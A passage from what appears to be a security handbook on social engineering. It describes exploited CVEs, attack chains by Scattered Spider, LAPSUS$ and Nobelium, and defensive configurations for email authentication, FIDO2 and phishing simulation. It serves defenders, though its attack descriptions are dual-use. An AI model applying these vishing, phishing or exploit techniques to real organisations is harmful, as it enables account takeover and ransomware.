**Trusted-sender phishing via compromised SaaS.** When an attacker compromises a shared SaaS platform (SharePoint, Google Drive, Dropbox), they can share malicious documents from within the platform. The sharing notification comes from the legitimate SaaS provider's email infrastructure (e.g., `no-reply@sharepointonline.com`), passes SPF/DKIM/DMARC, and is trusted by the recipient.

**npm / PyPI typosquatting as SE.** Attackers register package names similar to popular libraries (`co1ors` instead of `colors`, `python-dateuti1` instead of `python-dateutil`) containing malicious code. Developers who typo the package name or follow a manipulated tutorial install the malicious package. This is social engineering targeting developers — exploiting trust in the package ecosystem.

**CVE-2023-38831 (WinRAR path traversal — CVSS 7.8).** Exploited in the wild by multiple threat actors for supply chain phishing. A specially crafted RAR archive contains both a benign file (e.g., `document.pdf`) and a directory with the same name containing a malicious script. When the user opens what appears to be the PDF, WinRAR executes the script. Used by APT28, APT29, and DarkCasino in phishing campaigns targeting government and financial sector organizations.

**CVE-2023-23397 (Microsoft Outlook privilege escalation — CVSS 9.8).** A zero-click vulnerability exploited by APT28 (Forest Blizzard). A specially crafted calendar invite or email with a UNC path triggers NTLM authentication to an attacker-controlled server when Outlook processes the message — the victim does not need to open or preview the email. The captured NTLM hash enables relay attacks or offline cracking. No user interaction required beyond receiving the email.

**CVE-2024-21413 (Outlook MonikerLink — CVSS 9.8).** Allows bypassing Outlook's Protected View by using the `file://` moniker link format with an exclamation mark. When the victim clicks a link in the email, the malicious Office document opens in editing mode (bypassing Protected View sandboxing), enabling macro execution or exploit delivery without the usual security warnings.

### 10.5 Case studies

#### 10.5.1 Scattered Spider (UNC3944) — MGM Resorts and Caesars Entertainment (September 2023)

**Attack chain:**

1. **OSINT and reconnaissance.** The group (primarily English-speaking, late teens to early twenties) scraped LinkedIn to identify IT help desk personnel and their organizational structure at MGM Resorts.

2. **Vishing the help desk.** Attackers called the MGM IT help desk, impersonating an employee identified via LinkedIn. Using information gathered from social media (employee name, employee ID format, manager name), they convinced the help desk to reset MFA and issue a temporary credential. The social engineering was enhanced by knowledge of internal processes gleaned from job postings and employee social media posts.

3. **Identity provider compromise.** With the reset credentials, the attackers accessed Okta (MGM's identity provider) and registered their own MFA device. They then escalated to Okta administrator access, gaining control over SSO for MGM's entire application portfolio.

4. **Lateral movement and ransomware.** From Okta, the attackers accessed ESXi hypervisors and deployed ALPHV/BlackCat ransomware, encrypting critical systems. MGM's casino operations, hotel booking systems, and digital key card systems went offline for approximately 10 days.

5. **Impact.** MGM estimated $100 million in losses. Caesars Entertainment, targeted by the same group using similar techniques, paid a $15 million ransom to avoid operational disruption.

**Lessons learned.** The entire attack began with a single vishing call to the help desk. The help desk lacked: rigorous identity verification (no callback to a known number, no video verification), tiered authorization for MFA resets (a single help desk agent could reset MFA without supervisor approval), and real-time alerting on MFA reset events for privileged accounts.

#### 10.5.2 LAPSUS$ — comprehensive campaign (2022)

**Targets and methods.** LAPSUS$ (DEV-0537) compromised Nvidia, Samsung, Microsoft, Okta, T-Mobile, Uber, and Rockstar Games within a span of months using predominantly social engineering techniques:

- **Credential purchasing.** Bought credentials and session tokens from initial access brokers on dark web markets and Telegram channels.
- **MFA fatigue.** Repeatedly sent MFA push notifications to employees at late-night hours, sometimes supplementing with WhatsApp messages impersonating IT support (the Uber attack detailed in §1.3).
- **SIM swapping.** Bribed T-Mobile employees for access to internal SIM-swap tools, enabling SMS-based 2FA bypass.
- **Insider recruitment.** Publicly offered to pay employees of target companies for VPN credentials or MFA approval, advertising on Telegram.
- **Help desk social engineering.** Called help desks using employee PII gathered from data breaches and OSINT to request credential resets.

**Key takeaway.** LAPSUS$ demonstrated that a group with minimal technical sophistication but strong social engineering skills can compromise tier-1 technology companies. Their TTPs bypassed technical controls (MFA, EDR, network segmentation) by targeting the human element.

#### 10.5.3 Nobelium (APT29) — token theft campaign (2021-2023)

**Campaign evolution:**

1. **Phase 1: HTML smuggling (2021).** Nobelium sent spear-phishing emails to government and NGO targets with HTML attachments. The HTML file contained an encoded ISO disk image that was assembled and downloaded client-side via JavaScript Blob APIs (HTML smuggling — bypassing email gateway scanning). The ISO contained a malicious DLL and a shortcut file that loaded the DLL.

2. **Phase 2: AiTM phishing (2022-2023).** Nobelium shifted to AiTM phishing using custom-developed reverse-proxy infrastructure (not off-the-shelf Evilginx). They targeted OAuth tokens for Microsoft 365, capturing refresh tokens that provided persistent access. The phishing pages were hosted behind residential proxy networks to evade IP-reputation-based blocking.

3. **Phase 3: Token abuse and lateral movement.** With captured OAuth tokens, Nobelium accessed victim mailboxes via Microsoft Graph API, searched for sensitive communications, and used compromised accounts to send spear-phishing emails to downstream targets (supply chain phishing). They created OAuth applications with Mail.Read permissions for persistent access that survived password resets.

4. **Phase 4: Microsoft corporate breach (January 2024).** Nobelium compromised a legacy test OAuth application in Microsoft's corporate tenant via password spray. The application had excessive permissions. From this foothold, they accessed executive email accounts and source code repositories. Microsoft disclosed this breach in January 2024 and attributed it to Midnight Blizzard (Nobelium).

**CVE-2022-30190 (Follina / MSDT — CVSS 7.8).** Exploited by multiple threat actors in phishing campaigns concurrent with Nobelium's operations. A specially crafted Word document triggers the Microsoft Support Diagnostic Tool (MSDT) via the `ms-msdt:` protocol handler, achieving code execution without macros. The victim only needs to open (or in some cases preview) the document. Patched June 2022, but exploited in the wild from April 2022.

---

## 11. Hardening against social engineering

### 11.1 DMARC / DKIM / SPF enforcement

Email authentication is the foundational technical control against domain spoofing. Many organizations publish SPF and DKIM records but leave DMARC at `p=none` (monitoring only), providing no enforcement.

**SPF deployment (strict):**

```dns
; SPF record — enumerate ONLY authorized senders
; Use -all (hard fail) not ~all (soft fail)
example.com. IN TXT "v=spf1 ip4:203.0.113.0/24 include:_spf.google.com include:spf.protection.outlook.com -all"

; For domains that NEVER send email, publish a null SPF:
no-email-subdomain.example.com. IN TXT "v=spf1 -all"
```

**SPF pitfalls:** The 10-DNS-lookup limit (RFC 7208 §4.6.4) — each `include:`, `a:`, `mx:`, `redirect:` counts as a lookup. Exceeding 10 lookups causes SPF `permerror`, and many receivers treat `permerror` as `none` (no protection). Use `mxtoolbox.com/spf.aspx` or `dmarcian.com/spf-survey/` to count lookups. Flatten complex SPF records with tools like `spfplus.com` or `autospf.com`, but note that flattening requires maintenance when the included providers change their IP ranges.

**DKIM deployment:**

```bash
# Generate DKIM key pair (2048-bit RSA minimum — 1024-bit is deprecated)
opendkim-genkey -b 2048 -d example.com -s selector2025

# Publish the public key as a DNS TXT record
# selector2025._domainkey.example.com IN TXT "v=DKIM1; k=rsa; p=MIIBIjANBgkq..."

# Configure the MTA (Postfix example) to sign outbound mail
# /etc/opendkim.conf:
# Domain                  example.com
# KeyFile                 /etc/opendkim/keys/example.com/selector2025.private
# Selector                selector2025
# Socket                  inet:8891@localhost

# Verify DKIM signing is working
echo "test" | mail -s "DKIM test" test@example.com
# Check headers on received email for DKIM-Signature: header
```

**DMARC enforcement roadmap:**

```dns
; Phase 1: Monitor (2-4 weeks)
_dmarc.example.com. IN TXT "v=DMARC1; p=none; rua=mailto:dmarc-rua@example.com; ruf=mailto:dmarc-ruf@example.com; fo=1"

; Phase 2: Quarantine (2-4 weeks after Phase 1 analysis)
_dmarc.example.com. IN TXT "v=DMARC1; p=quarantine; pct=25; rua=mailto:dmarc-rua@example.com; ruf=mailto:dmarc-ruf@example.com; fo=1"

; Phase 3: Increase quarantine percentage
_dmarc.example.com. IN TXT "v=DMARC1; p=quarantine; pct=100; rua=mailto:dmarc-rua@example.com; ruf=mailto:dmarc-ruf@example.com; fo=1"

; Phase 4: Reject (full enforcement)
_dmarc.example.com. IN TXT "v=DMARC1; p=reject; rua=mailto:dmarc-rua@example.com; ruf=mailto:dmarc-ruf@example.com; fo=1"
```

**Interpreting DMARC aggregate reports (RUA).** DMARC aggregate reports are XML files sent daily by receiving mail servers. Parse them with `parsedmarc`:

```bash
# Install parsedmarc
pip install parsedmarc

# Parse aggregate reports
parsedmarc -o /var/dmarc/reports/ /var/dmarc/incoming/*.xml.gz

# Or configure continuous processing with Elasticsearch output
parsedmarc --elasticsearch-host localhost:9200 \
  --imap-host imap.example.com \
  --imap-user dmarc-rua@example.com \
  --imap-password "$IMAP_PASS" \
  --watch
```

Review RUA reports to identify: legitimate senders not covered by SPF/DKIM (add them before moving to `p=quarantine`), shadow IT services sending email on behalf of the domain, and unauthorized senders attempting to spoof the domain.

**Parked / non-sending domains.** Every domain the organization owns — including parked domains, redirector domains, and legacy domains — must publish defensive email authentication records:

```dns
; Null SPF - no authorized senders
parked-domain.com. IN TXT "v=spf1 -all"

; Null DKIM (wildcard)
*._domainkey.parked-domain.com. IN TXT "v=DKIM1; p="

; DMARC reject
_dmarc.parked-domain.com. IN TXT "v=DMARC1; p=reject; rua=mailto:dmarc-rua@example.com"

; No MX record
; (do not publish an MX record — implicit null MX per RFC 7505)
parked-domain.com. IN MX 0 .
```

### 11.2 Conditional Access and phishing-resistant MFA (FIDO2)

Phishing-resistant authentication eliminates the credential classes that AiTM and social engineering attacks exploit: passwords, TOTP codes, SMS codes, and push notifications.

**FIDO2 / WebAuthn deployment (Entra ID / Azure AD):**

```powershell
# Enable FIDO2 security key as an authentication method
# Entra ID Admin Center → Security → Authentication methods → FIDO2 security key

# Enforce FIDO2 via Conditional Access policy
# Policy: Require phishing-resistant MFA for all users accessing sensitive apps
New-AzureADMSConditionalAccessPolicy -DisplayName "Require FIDO2 for Sensitive Apps" `
  -State "Enabled" `
  -Conditions @{
    Applications = @{
      IncludeApplications = @("All")
    }
    Users = @{
      IncludeUsers = @("All")
      ExcludeGroups = @("BreakGlass-Admins")
    }
    ClientAppTypes = @("All")
  } `
  -GrantControls @{
    Operator = "OR"
    BuiltInControls = @("AuthenticationStrength")
    AuthenticationStrength = @{
      Id = "00000000-0000-0000-0000-000000000004"  # Phishing-resistant MFA
    }
  }
```

**Why FIDO2 defeats AiTM.** FIDO2/WebAuthn authentication binds to the origin domain. When the user authenticates through an AiTM proxy (`login.evil.example.com`), the authenticator checks the RP ID (relying party identifier) against the domain in the browser's address bar. Since `login.evil.example.com` ≠ `login.microsoftonline.com`, the authenticator refuses to sign the challenge. The authentication fails at the cryptographic level — no user error can bypass it.

**Passkey deployment considerations:**

- Device-bound passkeys (hardware security keys like YubiKey) are the strongest option — the private key never leaves the hardware token.
- Synced passkeys (Apple Keychain, Google Password Manager, 1Password) provide usability but the private key is backed up to cloud storage — acceptable for most users but not for highest-privilege accounts.
- Backup and recovery: provision at least two FIDO2 keys per user to prevent lockout. Store backup keys in a secure physical location.

**Conditional Access hardening policies (defense in depth):**

| Policy | Purpose |
|--------|---------|
| Require phishing-resistant MFA for all cloud apps | Eliminates password + TOTP/push as sufficient authentication |
| Require compliant/managed device | Stolen tokens replayed from unmanaged devices are blocked |
| Block legacy authentication | Disables POP3, IMAP, SMTP AUTH which do not support MFA |
| Require token protection (token binding) | Binds tokens to the device TLS certificate — replayed tokens fail on different devices |
| Sign-in frequency: 1 hour for sensitive apps | Limits the window of stolen token usefulness |
| Named locations: block sign-ins from non-business countries | Reduces attack surface for credential stuffing and AiTM replay |
| Risk-based Conditional Access | Entra ID Protection: require MFA re-authentication or block on high-risk sign-in detection |

### 11.3 Phishing simulation programs

Phishing simulation is the primary measurable control for human-layer defense. Effective programs go beyond "click rate" metrics.

**Program structure:**

- **Frequency:** Monthly simulations for all staff. Weekly targeted simulations for high-risk roles (finance, HR, executive assistants, help desk).
- **Difficulty progression:** Start with obvious phishing (external sender, generic greeting, suspicious URL). Progressively increase to spear-phishing (personalized, internal sender spoofing, brand-perfect landing pages) and advanced scenarios (QR codes, callback phishing, OAuth consent).
- **Consequence model:** First fail → automatic training module assignment. Second fail (within 6 months) → manager notification. Third fail → mandatory instructor-led training. No punitive actions (termination, public shaming) — these reduce reporting rates.

**Metrics beyond click rate:**

| Metric | Target | Why It Matters |
|--------|--------|---------------|
| Click rate | < 5% | Basic susceptibility measure |
| Report rate | > 70% | More important than click rate — measures whether users actively identify and report threats |
| Time-to-report (median) | < 10 minutes | How quickly the SOC receives phishing intelligence from the human sensor network |
| Credential submission rate | < 2% | Users who not only click but enter credentials — the actual harm metric |
| Repeat offender rate | < 3% | Users who fail multiple simulations — identifies individuals needing targeted intervention |
| Training completion rate | > 95% | Ensures remedial training is actually completed |

**Simulation platform configuration (GoPhish — building on §5.1):**

```bash
# Create a campaign with progressive difficulty
# Difficulty 1: Generic external phishing
# - External sender domain
# - Generic greeting ("Dear User")
# - Obvious URL mismatch
# - No personalization

# Difficulty 2: Targeted internal phishing
# - Spoofed internal sender (display name matches real employee)
# - Personalized greeting (first name)
# - Lookalike domain URL
# - References real internal project or system

# Difficulty 3: Advanced scenario
# - QR code in PDF attachment (no clickable URL)
# - Callback phishing (phone number only)
# - OAuth consent phishing (realistic permission request)
# - HTML smuggling payload

# Track results via GoPhish API
curl -s -H "Authorization: Bearer $GOPHISH_API_KEY" \
  "https://gophish.internal:3333/api/campaigns/$CAMPAIGN_ID/results" \
  | jq '[.[] | {email, status, reported}] | group_by(.status) | map({status: .[0].status, count: length})'
```

**Phishing report button deployment.** Deploy a phishing report button (Microsoft Report Message add-in, KnowBe4 Phish Alert Button, Cofense Reporter) in the email client. The button should: (1) remove the email from the user's inbox, (2) forward the email to the SOC/phishing analysis mailbox with full headers, and (3) provide immediate positive feedback to the user ("Thank you for reporting"). Integrate the phishing mailbox with a SOAR platform for automated analysis and response.

### 11.4 Physical social engineering countermeasures

Physical SE countermeasures address tailgating, badge cloning, impersonation, USB drops, and dumpster diving (attack techniques detailed in §1.9).

**Access control hardening:**

- **Anti-tailgating.** Mantrap / airlock entries for sensitive areas (server rooms, executive floors, data centers). Optical turnstiles with anti-passback for general office access. Tailgating detection systems (infrared beam-break sensors, video analytics) that alert security when multiple people pass on a single badge swipe.
- **Badge technology upgrade.** Migrate from 125 kHz proximity cards (HID Prox, EM4100 — trivially cloned with a $30 Proxmark3 or $5 T5577 blank) to 13.56 MHz smart cards with mutual authentication (HID iCLASS SE, SEOS, DESFire EV3). DESFire EV3 uses AES-128 mutual authentication — cloning requires the diversified key, which is not extractable from a brief proximity read. SEOS uses SCP03 secure channel protocol.
- **Photo-ID verification.** Security guards at main entrances verify that the badge photo matches the person presenting it. This defeats badge cloning (the cloned badge has the correct credential data but the wrong photo if visual verification is performed).
- **Visitor management.** All visitors sign in, receive a distinctly colored temporary badge (not the same form factor as employee badges), and are escorted at all times in sensitive areas. Visitor badges expire automatically (time-limited RFID) or are collected at checkout.

**USB attack countermeasures:**

- **Endpoint policy:** Disable USB mass storage via GPO / MDM policy. Allowlist specific authorized USB devices by vendor ID / product ID if USB storage is required for specific roles.
- **USB data diode / filtering appliances:** For environments where USB media must be used (air-gapped networks, manufacturing), deploy USB security stations (Honeywell Secure Media Exchange, OPSWAT MetaDefender Kiosk) that scan and sanitize USB media before it enters the network.
- **Awareness training:** Include USB drop scenarios in security awareness training. Teach employees to report found USB devices to security rather than plugging them in.
- **BadUSB / HID attack mitigation:** Deploy endpoint controls that detect rapid keyboard input from newly-connected USB HID devices (USB Rubber Ducky / Bash Bunny behavioral signature). Beamgun (open-source) monitors for new HID devices and alerts/blocks rapid keystroke injection.

**Dumpster diving countermeasures:**

- Cross-cut or micro-cut shredders (DIN 66399 Level P-4 minimum for sensitive documents, P-6/P-7 for classified material).
- Secure document disposal bins throughout the facility, collected and shredded by a bonded shredding service.
- Hard drive and media destruction policy: NIST SP 800-88 Rev. 1 compliant purge or destroy for decommissioned storage media.

**Lock picking and physical bypass countermeasures:**

- High-security lock cylinders (Abloy Protec2, Medeco M4, Mul-T-Lock MT5+) that resist common picking and bumping techniques.
- Electronic access control on all sensitive areas (server rooms, network closets, executive offices) — never rely solely on a mechanical key.
- Regular physical penetration testing (annually) to identify bypass vulnerabilities: unlocked doors, propped-open fire exits, accessible drop ceilings between access-controlled and non-controlled areas, and HVAC ducts large enough for traversal.

---

## 12. Cross-references

**To Domain 8 (web):** Spear-phishing (§1.2) delivers the web-based payloads (credential-harvesting pages, malicious downloads) described in Chapter 8A (XSS, OAuth abuse) and Chapter 8B (SSRF — the phishing link may target an internal SSRF endpoint). OSINT subdomain enumeration (§4.1) feeds into web-application reconnaissance. Google dorking (§4.3) discovers exposed web assets.

**To Domain 14 (AD/Windows):** BEC (§1.6) and consent phishing (§1.7) target the Microsoft 365 infrastructure described in Chapter 14B §5. MFA fatigue (§1.3) bypasses the Conditional Access policies described in Chapter 14B §3.4. Credential stuffing (the precursor to MFA fatigue) uses credentials from breaches found via HIBP and breach databases (§3.4).

**To Domain 11 (tradecraft):** USB attacks (§1.8) are the initial-access vector for the malware and C2 infrastructure described in Chapter 11A. The payload delivered by a Rubber Ducky or Bash Bunny is typically a reverse shell or implant from the C2 framework (Cobalt Strike, Mythic, Sliver). Evilginx2 (§5.2) provides initial access tokens that feed into the post-exploitation tradecraft.

**To Domain 15 (mobile):** SIM swapping (§1.4) exploits the mobile-network identity model described in Chapter 15B §3 (the SUPI/IMSI and the carrier's subscriber management). The 5G SUCI concealment (Chapter 15B §3.2) does not help against SIM swapping because the attack targets the carrier's customer-service process, not the radio protocol. Smishing (§5.4) targets mobile users with phishing links optimized for mobile browsers.

**To Domain 20 (RF):** Badge cloning (§1.9) uses the 125 kHz RFID cloning techniques from Domain 20 §3. The Proxmark3 is the standard tool for both OSINT (reading badge formats) and exploitation (cloning badges).

**To Domain 9 (cryptography/PKI):** Certificate Transparency (§4.1) uses the CT log infrastructure described in Domain 9 Chapter 9A §3.6. SPF/DKIM/DMARC (§1.2) relies on the DNS security model and cryptographic signing described in Domain 9. STIR/SHAKEN caller-ID verification (§1.5) uses a certificate-based trust chain.
